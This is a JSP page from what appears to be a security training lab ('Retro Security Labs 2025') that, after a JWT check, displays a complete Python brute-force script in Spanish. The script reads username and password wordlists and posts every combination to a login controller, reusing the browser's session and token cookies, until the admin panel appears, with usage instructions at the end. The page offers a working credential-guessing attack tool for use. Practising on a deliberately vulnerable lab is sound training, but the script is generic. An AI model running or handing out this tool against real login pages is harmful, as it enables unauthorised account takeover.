<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="utils.JWTUtils" %>
<%@ page import="utils.UsuarioJWT" %>

<%

	UsuarioJWT usuarioJWT = null;
	
	try {
	    usuarioJWT = JWTUtils.obtenerUsuarioDesdeRequest(request);
	} catch (Exception e) {
	    // Redirigir al servlet de logout en vez de al .jsp
	    response.sendRedirect(request.getContextPath() + "/logout");
	    return;
	}
%>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Brute Force Script</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #1a1a1a;
      color: #a8c686;
      font-family: 'Press Start 2P', monospace;
      margin: 0;
      padding: 0;
      overflow-y: auto;
    }

    .bios-container {
      background-color: #2c2c2c;
      border: 2px solid #777;
      padding: 30px;
      max-width: 800px;
      margin: 40px auto;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      align-items: center;
      line-height: 2;
    }

    .retro-image {
      display: block;
      width: 64px;
      height: auto;
      image-rendering: pixelated;
      filter: grayscale(100%) brightness(1.2);
      object-fit: cover;
      border-radius: 50px;
      margin-bottom: 10px;
    }

    .bios-header {
      font-size: 14px;
      text-align: center;
      margin-bottom: 25px;
      color: #e5e5c9;
    }

    pre {
      background-color: #111;
      color: #0f0;
      border: 2px solid #777;
      padding: 15px;
      font-size: 10px;
      font-family: 'Press Start 2P', monospace;
      white-space: pre-wrap;
      overflow-wrap: break-word;
      width: 100%;
      height: 400px;
      overflow-y: auto;
      border-radius: 8px;
    }

    .bios-footer {
		  margin-top: 30px;
		  font-size: 8px;
		  text-align: center;
		  color: #999;
		}

    button {
      background-color: #444;
      color: #fffde7;
      border: none;
      padding: 10px;
      font-family: 'Press Start 2P', monospace;
      font-size: 10px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #666;
    }
  </style>
</head>
<body>

  <div class="bios-container">
    <img src="https://cdn-icons-png.flaticon.com/512/684/684908.png" alt="Retro Icon" class="retro-image">
    <a href="<%= request.getContextPath() %>/labs/retroGame/retroGame-login.jsp" style="text-decoration: none; color: #a8c686;">VOLVER AL LOGIN</a>
    <div class="bios-header">BruteForce Login Tool - Script de Fuerza Bruta</div>

    <!-- Script en una terminal retro -->
    <pre style="color: #e5e5c9 !important;">
import requests
import argparse

# URL de login de la web
login_url = "http://&lt;PATH_HTTP&gt;/LoginGameRetroControlador" # Poner la ruta del HTTP

cookies = {
    "JSESSIONID": "&lt;JSESSIONID&gt;", # Poner la Cookie del "JSESSIONID" de tu navegador
    "token": "&lt;TOKEN&gt;" # Poner la Cookie del "token" de tu navegador
}

# Cabecera de la solicitud
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Función para cargar el diccionario de usuarios desde un archivo
def cargar_usuarios(usuarios_path):
    try:
        with open(usuarios_path, 'r') as file:
            usuarios = [line.strip() for line in file.readlines()]
        return usuarios
    except FileNotFoundError:
        print(f"[ERROR] El archivo de usuarios no se encuentra en la ruta: {usuarios_path}")
        exit(1)

# Función para cargar el diccionario de contraseñas desde un archivo
def cargar_contrasenas(diccionario_path):
    try:
        with open(diccionario_path, 'r') as file:
            contrasenas = [line.strip() for line in file.readlines()]
        return contrasenas
    except FileNotFoundError:
        print(f"[ERROR] El archivo de contraseñas no se encuentra en la ruta: {diccionario_path}")
        exit(1)

# Función para probar las combinaciones de usuario y contraseña
def probar_credenciales(usuario, contrasena):
    # Parámetros para el POST
    body = {
        "username": usuario,
        "password": contrasena
    }

    try:
        # Realizar la solicitud POST con redirección habilitada
        response = requests.post(login_url, cookies=cookies, data=body, headers=headers, allow_redirects=True)

        # Comprobar si hemos sido redirigidos a una página de login
        if "Login Retro 60s" in response.text:
            print(f"[-] Credenciales incorrectas: Usuario: {usuario}, Contraseña: {contrasena}")
        elif "PANEL DE ADMINISTRADOR" in response.text:
            print(f"[+] Credenciales correctas: Usuario: {usuario}, Contraseña: {contrasena}")
            return True  # Si encontramos el panel de administrador, terminamos la búsqueda
        else:
            print(f"[+] Credenciales correctas: Usuario: {usuario}, Contraseña: {contrasena}")
            return True  # Si encontramos el panel de administrador, terminamos la búsqueda

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Ocurrió un error: {e}")

    return False  # Si no es correcto, devolvemos False

# Probar todas las combinaciones de usuario y contraseña
def probar_combinaciones(usuarios, contrasenas):
    for usuario in usuarios:
        for contrasena in contrasenas:
            if probar_credenciales(usuario, contrasena):
                return  # Detener cuando encontremos credenciales correctas

    print("No se encontraron credenciales válidas.")

# Main
if __name__ == '__main__':
    # Argumentos de la línea de comandos
    parser = argparse.ArgumentParser(
        description="Realiza pruebas de login a una web usando diccionarios de usuarios y contraseñas")

    # Argumento para el archivo de usuarios
    parser.add_argument('-u', '--usuarios', type=str, required=True,
                        help="Ruta al archivo de texto que contiene los usuarios a probar (uno por línea).")

    # Argumento para el archivo de contraseñas
    parser.add_argument('-w', '--contrasenas', type=str, required=True,
                        help="Ruta al archivo de texto que contiene las contraseñas a probar (una por línea).")

    # Parsear los argumentos
    args = parser.parse_args()

    # Cargar usuarios y contraseñas desde los archivos
    usuarios = cargar_usuarios(args.usuarios)
    contrasenas = cargar_contrasenas(args.contrasenas)

    # Ejecutar la prueba de combinaciones
    probar_combinaciones(usuarios, contrasenas)

# USO: python3 .\bruteForce.py -u users.txt -w pass.txt
    </pre>

    <!-- Footer -->
    <div class="bios-footer">Retro Security Labs 2025</div>

  </div>
</body>
</html>
